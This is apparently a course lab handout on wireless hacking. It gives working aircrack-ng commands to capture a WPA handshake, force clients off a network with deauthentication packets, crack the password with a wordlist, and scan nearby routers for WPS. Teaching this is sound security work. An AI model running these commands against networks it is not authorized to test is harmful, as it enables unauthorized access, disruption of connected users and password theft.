# Module 16: Wireless Hacking Lab

**Note**: Only perform these tests on your own router. Hacking other people's Wi-Fi is a serious crime.

### Task 1: Monitor Mode and Scanning
1. Connect your compatible Wi-Fi adapter.
2. Enable monitor mode: `airmon-ng start wlan0`.
3. Run `airodump-ng wlan0mon` and identify your own router's **BSSID** and **Channel**.

### Task 2: Capturing the Handshake
1. Start capturing traffic from your router:
   `airodump-ng -c <chan> --bssid <bssid> -w my_handshake wlan0mon`.
2. In a second terminal, send a deauth packet to your own phone/laptop:
   `aireplay-ng -0 5 -a <bssid> -c <client_mac> wlan0mon`.
3. Look at the top right of the `airodump-ng` screen. When it says **"WPA Handshake: [BSSID]"**, you have the hash!

### Task 3: Cracking the Password
1. Use the `rockyou.txt` wordlist to crack the capture file:
   `aircrack-ng -w /usr/share/wordlists/rockyou.txt my_handshake-01.cap`.
2. Observe the time it takes to find the password.

### Task 4: WPS Reconnaissance
1. Run `wash -i wlan0mon` to see which routers in your area have WPS enabled.
2. Research why WPS is considered a vulnerability.
